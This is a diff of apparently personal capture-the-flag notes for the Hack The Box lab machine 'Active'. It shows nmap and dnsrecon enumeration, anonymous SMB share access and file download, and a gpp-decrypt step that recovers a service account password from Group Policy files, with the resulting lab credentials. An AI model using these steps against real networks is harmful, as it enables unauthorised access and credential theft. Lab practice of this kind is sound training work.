@@ -10,12 +10,15 @@ Powershell
 
 ### **Enumeratiion::**
 nmap -p- -A -oN (-f to bypass FW) Activeports.txt ${IP}
+dnsrecon -d 10.10.10.100 -r 10.0.0.0/8
+locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
+        #find all nmap scripts to enum smb
 
 ```
 53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
 | dns-nsid: 
 |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-25 01:07:00Z)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-25 01:07:00Z) #Make sure attack box is within 1min of this time.
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
@@ -43,7 +46,7 @@ Host script results:
 + 
 
 ### **Part 1::** 
-
+```
 smbclient -L \\\\Active\\                                                                             1 ⨯
 Enter WORKGROUP\kali's password: 
 Anonymous login successful
@@ -73,8 +76,9 @@ smbclient \\\\Active\\Replication
   smb: prompt off
   smb: resurse on
   smb: mget *
-
+```
   # gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ :: GPPstillStandingStrong2k18
   
+  **Creds::**
   active.htb/svc_tgs:GPPstillStandingStrong2k18
 
